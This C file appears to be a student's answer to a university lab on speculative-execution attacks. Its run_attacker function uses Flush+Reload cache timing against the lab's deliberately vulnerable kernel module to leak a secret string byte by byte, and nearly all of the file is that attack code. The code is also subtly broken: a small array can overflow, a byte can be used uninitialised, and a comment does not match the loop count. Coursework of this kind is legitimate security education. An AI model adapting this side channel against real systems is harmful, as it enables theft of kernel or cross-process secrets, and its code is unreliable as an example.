/*
 * Lab 2 for Securing Processor Architectures - Fall 2022
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "lab2.h"
#include "lab2ipc.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    lab2_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[LAB2_SECRET_MAX_LEN];
    size_t current_offset = 0;
    int access_time;
    char leaked_byte_array[4];
    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;
	int char_found[4] = {0, 0, 0, 0};
	// I am iterating for 3 times as noise might be there
        // [Part 1]- Fill this in!
        // Feel free to create helper methods as necessary.
        // Use "call_kernel_part1" to interact with the kernel module
        // Find the value of leaked_byte for offset "current_offset"
        // leaked_byte = ??
	for (int i = 0; i < 4; ) { 

       		for (int j = 0; j < 128; j++) {
           		clflush(shared_memory + 4096*j);
       		}
	call_kernel_part1(kernel_fd, shared_memory, current_offset);


	for (int line = 0; line < 128; line++) {
	       access_time = time_access(shared_memory + 4096*line);
               if (access_time < 100) {
			leaked_byte_array[i] = (char) line;
			i++;
	
		       }
        }

    }
	for (int i =0; i <4; i++) {
	  for (int j = 0; j < 4; j++) {
             if (i != j) 
              if (leaked_byte_array[i] == leaked_byte_array[j]) {
	          char_found[i]++;
	      }
        }
      	if (char_found[i] >= 3) {
      	leaked_byte = leaked_byte_array[i];
      	break; 
      }
     }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
